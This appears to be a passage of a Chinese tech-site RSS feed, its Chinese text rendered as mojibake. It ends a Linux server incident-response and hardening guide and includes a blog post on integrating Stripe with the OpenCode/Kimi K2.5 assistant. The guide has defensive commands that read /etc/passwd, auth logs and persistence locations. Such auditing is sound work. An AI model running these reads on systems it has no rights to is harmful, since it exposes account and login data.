lsof -i                <span class="hljs-comment"># æŸ¥çœ‹å“ªäº›è¿›ç¨‹åœ¨ä½¿ç”¨ç½‘ç»œ</span>
</code></pre>
</li>
<li>
<p><strong>æ£€æŸ¥å®šæ—¶ä»»åŠ¡ä¸å¯åŠ¨é¡¹</strong><br/>
ç—…æ¯’å¸¸é€šè¿‡ cron æˆ– systemd æŒä¹…åŒ–ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">crontab -l             <span class="hljs-comment"># å½“å‰ç”¨æˆ·å®šæ—¶ä»»åŠ¡</span>
<span class="hljs-built_in">cat</span> /etc/crontab       <span class="hljs-comment"># ç³»ç»Ÿçº§å®šæ—¶ä»»åŠ¡</span>
<span class="hljs-built_in">ls</span> /etc/cron.d/
systemctl list-unit-files --<span class="hljs-built_in">type</span>=service | grep enabled
<span class="hljs-built_in">ls</span> /etc/init.d/
</code></pre>
</li>
<li>
<p><strong>æ£€æŸ¥æ–°å¢ç”¨æˆ·æˆ–å¼‚å¸¸SSHç™»å½•</strong></p>
<pre><code class="hljs language-bash" lang="bash">last                   <span class="hljs-comment"># æŸ¥çœ‹æœ€è¿‘ç™»å½•è®°å½•</span>
<span class="hljs-built_in">who</span>                    <span class="hljs-comment"># å½“å‰ç™»å½•ç”¨æˆ·</span>
<span class="hljs-built_in">cat</span> /etc/passwd        <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦æœ‰å¼‚å¸¸ç”¨æˆ·ï¼ˆUID 0 é rootï¼‰</span>
grep <span class="hljs-string">"Accepted"</span> /var/log/auth.log  <span class="hljs-comment"># Ubuntu/Debian</span>
grep <span class="hljs-string">"Accepted"</span> /var/log/secure    <span class="hljs-comment"># CentOS/RHEL</span>
</code></pre>
</li>
</ol>
<hr/>
<p>###äºŒã€<strong>æ¼æ´æ’æŸ¥ä¸ä¿®å¤</strong></p>
<ol>
<li>
<p><strong>ç¡®ä¿ç³»ç»Ÿå’Œè½¯ä»¶æœ€æ–°</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Ubuntu/Debian</span>
sudo apt update &amp;&amp; sudo apt upgrade -y

<span class="hljs-comment"># CentOS/RHEL</span>
sudo yum update -y   <span class="hljs-comment"># æˆ– dnf updateï¼ˆCentOS 8+ï¼‰</span>
</code></pre>
</li>
<li>
<p><strong>å…³é—­ä¸å¿…è¦çš„æœåŠ¡å’Œç«¯å£</strong><br/>
ä½¿ç”¨ <code>nmap localhost</code> æˆ– <code>ss -tuln</code> æŸ¥çœ‹å¼€æ”¾ç«¯å£ï¼Œå…³é—­ä¸ç”¨çš„æœåŠ¡ï¼ˆå¦‚ FTPã€Telnetã€Redis æœªæˆæƒè®¿é—®ç­‰ï¼‰ã€‚</p>
</li>
<li>
<p><strong>ä¿®æ”¹é»˜è®¤ SSH é…ç½®</strong><br/>
ç¼–è¾‘ <code>/etc/ssh/sshd_config</code>ï¼š</p>
<pre><code class="hljs language-perl" lang="perl">Port <span class="hljs-number">22222</span>               <span class="hljs-comment"># æ”¹ä¸ºéæ ‡å‡†ç«¯å£ï¼ˆè®°å¾—åœ¨å®‰å…¨ç»„æ”¾è¡Œï¼‰</span>
PermitRootLogin <span class="hljs-keyword">no</span>       <span class="hljs-comment"># ç¦æ­¢ root ç™»å½•</span>
PasswordAuthentication <span class="hljs-keyword">no</span> <span class="hljs-comment"># æ”¹ç”¨å¯†é’¥ç™»å½•ï¼ˆæ›´å®‰å…¨ï¼‰</span>
AllowUsers your_user     <span class="hljs-comment"># ä»…å…è®¸ç‰¹å®šç”¨æˆ·</span>
</code></pre>
<p>ä¿®æ”¹åé‡å¯ SSHï¼š<code>sudo systemctl restart sshd</code></p>
</li>
<li>
<p><strong>å®‰è£…å¹¶é…ç½®é˜²ç«å¢™</strong></p>
<ul>
<li>ä½¿ç”¨ <code>ufw</code>ï¼ˆUbuntuï¼‰æˆ– <code>firewalld</code>ï¼ˆCentOSï¼‰</li>
<li>æˆ–ç›´æ¥ä¾èµ–<strong>é˜¿é‡Œäº‘å®‰å…¨ç»„</strong>ï¼šåªå¼€æ”¾å¿…è¦ç«¯å£ï¼ˆå¦‚ 80ã€443ã€è‡ªå®šä¹‰ SSH ç«¯å£ï¼‰</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-1">ä¸‰ã€<strong>ä½¿ç”¨å®‰å…¨å·¥å…·æ‰«æ</strong></h3>
<ol>
<li>
<p><strong>å®‰è£…æ€æ¯’/æ¶æ„è½¯ä»¶æ‰«æå·¥å…·</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.clamav.net%2F" target="_blank" title="https://www.clamav.net/" ref="nofollow noopener noreferrer">ClamAV</a>ï¼ˆå¼€æºæ€æ¯’ï¼‰</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsourceforge.net%2Fprojects%2Frkhunter%2F" target="_blank" title="https://sourceforge.net/projects/rkhunter/" ref="nofollow noopener noreferrer">rkhunter</a>ï¼ˆæ£€æµ‹ rootkitï¼‰</li>
<li><a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.chkrootkit.org%2F" target="_blank" title="http://www.chkrootkit.org/" ref="nofollow noopener noreferrer">chkrootkit</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcisofy.com%2Flynis%2F" target="_blank" title="https://cisofy.com/lynis/" ref="nofollow noopener noreferrer">Lynis</a>ï¼ˆç³»ç»Ÿå®‰å…¨å®¡è®¡ï¼‰</li>
</ul>
<p>ç¤ºä¾‹å®‰è£… rkhunterï¼š</p>
<pre><code class="hljs language-css" lang="css">sudo apt install rkhunter -y
sudo rkhunter <span class="hljs-attr">--update</span>
sudo rkhunter <span class="hljs-attr">--check</span>
</code></pre>
</li>
<li>
<p><strong>ä½¿ç”¨é˜¿é‡Œäº‘è‡ªå¸¦çš„å®‰å…¨äº§å“</strong></p>
<ul>
<li>
<p><strong>äº‘å®‰å…¨ä¸­å¿ƒï¼ˆåŸå®‰éª‘å£«ï¼‰</strong> ï¼šå…è´¹ç‰ˆå³å¯ç›‘æ§å…¥ä¾µã€ç—…æ¯’ã€æ¼æ´ã€‚</p>
<ul>
<li>ç™»å½• <a href="https://link.juejin.cn?target=https%3A%2F%2Fyundun.console.aliyun.com%2F" target="_blank" title="https://yundun.console.aliyun.com/" ref="nofollow noopener noreferrer">é˜¿é‡Œäº‘æ§åˆ¶å° &gt; äº‘å®‰å…¨ä¸­å¿ƒ</a></li>
<li>å¼€å¯â€œç—…æ¯’æŸ¥æ€â€ã€â€œåŸºçº¿æ£€æŸ¥â€ã€â€œå…¥ä¾µæ£€æµ‹â€</li>
</ul>
</li>
<li>
<p>è‹¥æœªå¼€å¯ï¼Œè¯·ç«‹å³å¯ç”¨ï¼Œå¹¶å…¨ç›˜æ‰«æã€‚</p>
</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-2">å››ã€<strong>é•¿æœŸé˜²æŠ¤å»ºè®®</strong></h3>
<ol>
<li><strong>æœ€å°æƒé™åŸåˆ™</strong>ï¼šä¸è¦ç”¨ root è¿è¡Œä¸šåŠ¡ç¨‹åºã€‚</li>
<li><strong>å®šæœŸå¤‡ä»½</strong>ï¼šä½¿ç”¨å¿«ç…§æˆ– OSS å¤‡ä»½å…³é”®æ•°æ®ã€‚</li>
<li><strong>å¯ç”¨å¤šå› ç´ è®¤è¯ï¼ˆMFAï¼‰</strong> ï¼šä¿æŠ¤é˜¿é‡Œäº‘è´¦å·ã€‚</li>
<li><strong>æ—¥å¿—é›†ä¸­ç®¡ç†</strong>ï¼šå°† <code>/var/log/</code> æ—¥å¿—å‘é€åˆ° SLSï¼ˆæ—¥å¿—æœåŠ¡ï¼‰ä¾¿äºåˆ†æã€‚</li>
<li><strong>å®šæœŸå®‰å…¨å®¡è®¡</strong>ï¼šæ¯æœˆæ£€æŸ¥ä¸€æ¬¡ç”¨æˆ·ã€ç«¯å£ã€è¿›ç¨‹ã€å®šæ—¶ä»»åŠ¡ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-3">äº”ã€<strong>å¦‚æœå·²ä¸¥é‡æ„ŸæŸ“ï¼Ÿ</strong></h3>
<ul>
<li>
<p><strong>æœ€å½»åº•çš„æ–¹å¼</strong>ï¼š</p>
<ol>
<li>åˆ›å»ºå½“å‰ç³»ç»Ÿå¿«ç…§ï¼ˆç”¨äºå–è¯ï¼‰</li>
<li><strong>é‡è£…ç³»ç»Ÿ</strong>ï¼ˆä½¿ç”¨é˜¿é‡Œäº‘æä¾›çš„å¹²å‡€é•œåƒï¼‰</li>
<li><strong>ä»…æ¢å¤ç¡®è®¤å¹²å‡€çš„æ•°æ®</strong>ï¼ˆä¸è¦æ¢å¤å¯æ‰§è¡Œæ–‡ä»¶æˆ–è„šæœ¬ï¼‰</li>
<li>é‡æ–°éƒ¨ç½²åº”ç”¨ï¼Œå¹¶åº”ç”¨ä¸Šè¿°å®‰å…¨æªæ–½</li>
</ol>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å…è´¹æ¥å…¥ Stripeï¼Œä¸åˆ° 2 å°æ—¶æå®šï¼šOpenCode + K2.5 å®æ“å…¨æµç¨‹]]></title>    <link>https://juejin.cn/post/7600986252448972840</link>    <guid>https://juejin.cn/post/7600986252448972840</guid>    <pubDate>2026-01-30T12:26:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600986252448972840" data-draft-id="7600799940971495464" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å…è´¹æ¥å…¥ Stripeï¼Œä¸åˆ° 2 å°æ—¶æå®šï¼šOpenCode + K2.5 å®æ“å…¨æµç¨‹"/> <meta itemprop="keywords" content="AIç¼–ç¨‹,AIGC,OpenAI"/> <meta itemprop="datePublished" content="2026-01-30T12:26:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å­Ÿå¥AIç¼–ç¨‹"/> <meta itemprop="url" content="https://juejin.cn/user/4212984287073895"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å…è´¹æ¥å…¥ Stripeï¼Œä¸åˆ° 2 å°æ—¶æå®šï¼šOpenCode + K2.5 å®æ“å…¨æµç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4212984287073895/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å­Ÿå¥AIç¼–ç¨‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T12:26:16.000Z" title="Fri Jan 30 2026 12:26:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å­Ÿå¥ã€‚</p>
<p>ä»Šå¤©å°è¯•ç”¨ OpenCode çš„<strong>å…è´¹ K2.5 æ¨¡å‹</strong>æ¥å…¥ Stripeï¼Œæ•´ä¸ªè¿‡ç¨‹éå¸¸ä¸æ»‘ï¼Œ<strong>ä¸€åˆ†é’±æ²¡èŠ±</strong>ï¼Œä¸åˆ° 2 å°æ—¶å°±æå®šäº†ã€‚</p>
<p>K2.5 æ•´ä½“è¡¨ç°æŒºå¼ºçš„ï¼Œå“åº”å¿«ã€é¢åº¦å……è£•ï¼ŒæŠŠå®Œæ•´è¿‡ç¨‹åˆ†äº«ç»™å¤§å®¶ã€‚</p>
<h2 data-id="heading-0">01 è¿æ¥æ¨¡å‹</h2>
<p>å®‰è£…å¥½ OpenCode ä¹‹åï¼Œè¾“å…¥ <code>/connect</code> å‘½ä»¤æ¥è¿æ¥æ¨¡å‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c903e0813ee243778908f0ca5c1d7aed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=BY1uLlvy5NPxtj3cPON9C69QVUA%3D" alt="" loading="lazy"/></p>
<p>é€‰æ‹© <strong>Opencode Zen</strong>ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7bd21a530cb243acbb48954502edc847~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=%2BFpeU8D4TdR4WVNdeEAGO3zG%2Fj0%3D" alt="" loading="lazy"/></p>
<p>ç„¶åè¾“å…¥ä½ çš„ API Key å°±å¯ä»¥ä½¿ç”¨äº†ã€‚Key å¯ä»¥å» OpenCode å®˜ç½‘çš„ Zen æ¨¡å—ç”³è¯·ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fopencode.ai%2F" target="_blank" title="https://opencode.ai/" ref="nofollow noopener noreferrer">opencode.ai/</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17451ae345bb4f54ab182dad71535061~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=w5Vm%2BlOizvmGTCDiHyk3afSOZns%3D" alt="" loading="lazy"/></p>
<p>è¾“å…¥å®Œ Key ä¹‹åï¼Œä¼šå‘ç°æœ‰ <strong>5 ä¸ªæ¨¡å‹éƒ½å¯ä»¥å…è´¹ä½¿ç”¨</strong>ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/705f3a90d1144e548a3206e0a46d6698~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=9OQsiQAe%2BvpgmdA5%2FiyhK23WWOE%3D" alt="" loading="lazy"/></p>
<p>é€‰æ‹© <strong>Kimi K2.5 Free</strong>ï¼Œå°±å¯ä»¥å¼€å§‹äº†ã€‚</p>
<h2 data-id="heading-1">02 è®© K2.5 å¸®æˆ‘æ¥ Stripe</h2>
<p>å› ä¸ºæˆ‘æ˜¯ç¬¬ä¸€æ¬¡æ¥å…¥ Stripeï¼Œä¹Ÿæ²¡æœ‰åº•ï¼Œæ‰€ä»¥å…ˆè®©å®ƒç»™ç‚¹å»ºè®®ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb8e2f50f1c84057bd91b9f6ab1aa48f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=4KW9hx6jdMtc3ShMc9PG8bFK3P8%3D" alt="" loading="lazy"/></p>
<p>å®ƒå‘Šè¯‰æˆ‘è¦åœ¨ Stripe åå°åˆ›å»ºäº§å“ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e37d6c812464b12b9054ab676af5bdf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=dlPwZXavenxHz4KDoLg713ejWVI%3D" alt="" loading="lazy"/></p>
<p>ä¸è¿‡æˆ‘æ¯”è¾ƒæ‡’ï¼Œä¸æƒ³æ‰‹åŠ¨åˆ›å»ºï¼Œå°±é—®å®ƒèƒ½ä¸èƒ½ç”¨ API æ¥æå®šï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bfa361622ae42a784add51271894d05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=ThbF3qlMdg%2BtGub1J7CLPdnjgyA%3D" alt="" loading="lazy"/></p>
<p>å®ƒç›´æ¥å¸®æˆ‘å†™äº†ä¸€ä¸ªè„šæœ¬ï¼Œåªéœ€è¦å¡«å…¥å¯†é’¥å°±å¥½ã€‚æˆ‘å» Stripe åå°æ‹¿åˆ°å¯†é’¥ï¼Œå¡«è¿›å»ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a74d5ab16274ab98c3e917f5c49af6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=E0m09wXcNj2jQUfqj8CfpIszH3s%3D" alt="" loading="lazy"/></p>
<p>ç„¶åï¼Œ<strong>å®ƒä¸€æŠŠå¸®æˆ‘æŠŠä»£ç å†™å¥½äº†ï¼Œäº§å“ä¹Ÿåˆ›å»ºå¥½äº†</strong>ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0671b0b5d5254aaeab15b1fa463ba8f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=HkIlufmsgtVJL%2BRQwd0kbaj0gD8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">03 åˆ›å»º Webhooks</h2>
<p>æ¥ä¸‹æ¥æ˜¯åˆ›å»º Webhooksã€‚æˆ‘è¿˜æ˜¯æ¯”è¾ƒæ‡’ï¼Œçœ‹çœ‹å®ƒèƒ½ä¸èƒ½å¸®æˆ‘åˆ›å»ºâ€”â€”ç»“æœ<strong>ç›´æ¥ä¸€é”®æå®š</strong>ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e82cd7bec8ad48cf9abb33cd37c8b6ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=PWpADvxinMWbpg0s0t6ayG8SE7c%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ç»™å®ƒä¸€ä¸ªæœ¬åœ°è°ƒè¯•åœ°å€ï¼Œå®ƒæ›¿æ¢åˆ° Webhooks é‡Œï¼Œå‘Šè¯‰æˆ‘å¯ä»¥æµ‹è¯•äº†ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/354909a348ec4014bf82c936ba54b9a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=9KWIYYdoDyNvcWUPpT0hCl%2FXczo%3D" alt="" loading="lazy"/></p>
<p><strong>ä»˜æ¬¾ä¸€æ¬¡æˆåŠŸï¼Œæ²¡æœ‰ä»»ä½•æ³¢æŠ˜ï¼š</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3b3797ed32e4765a94229696fc1d5af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=K49p2nJ8NE37e7c3%2BYXJRUeZHNU%3D" alt="" loading="lazy"/></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æ­£å¼ç¯å¢ƒå†æ¥ä¸€éï¼Œç›´æ¥éƒ¨ç½²ä¸Šçº¿ã€‚</p>
<h2 data-id="heading-3">04 å†™åœ¨æœ€å</h2>
<p>æ•´ä¸ªè¿‡ç¨‹ä¸åˆ° 2 å°æ—¶ï¼Œæˆ‘å°±æŠŠ Stripe æ¥å®Œäº†ã€‚</p>
<p>K2.5 æ•´ä½“å“åº”é€Ÿåº¦å¾ˆå¿«ï¼Œè€Œä¸” Free é¢åº¦ä¸€ç‚¹ä¹Ÿä¸å¡é¡¿ï¼Œéå¸¸å……è£•â€”â€”æˆ‘æ¥å®Œæ•´ä¸ª Stripe éƒ½æ²¡é‡åˆ°ä»»ä½•é™åˆ¶ã€‚</p>
<p><strong>æ¨èå¤§å®¶éƒ½å»è¯•è¯•ã€‚</strong></p>
<hr/>
<p>ğŸš€ æƒ³è¦ä¸æ›´å¤šAIçˆ±å¥½è€…äº¤æµï¼Œå…±åŒæˆé•¿å—ï¼Ÿ</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FZ4k_5_waWJbRRo5lZBZmog" target="_blank" title="https://mp.weixin.qq.com/s/Z4k_5_waWJbRRo5lZBZmog" ref="nofollow noopener noreferrer">å’Œä¸€ç¾¤å¿—åŒé“åˆçš„äººï¼ŒæŒç»­ç²¾è¿› AI çš„æ¯ä¸€å¤©</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[flutteræ·»åŠ é—´éš™gapæºç è§£æ]]></title>    <link>https://juejin.cn/post/7601028900885446702</link>    <guid>https://juejin.cn/post/7601028900885446702</guid>    <pubDate>2026-01-30T12:46:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601028900885446702" data-draft-id="7600967006893637641" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="flutteræ·»åŠ é—´éš™gapæºç è§£æ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-30T12:46:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Nicholas68"/> <meta itemprop="url" content="https://juejin.cn/user/1222312662146766"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            flutteræ·»åŠ é—´éš™gapæºç è§£æ
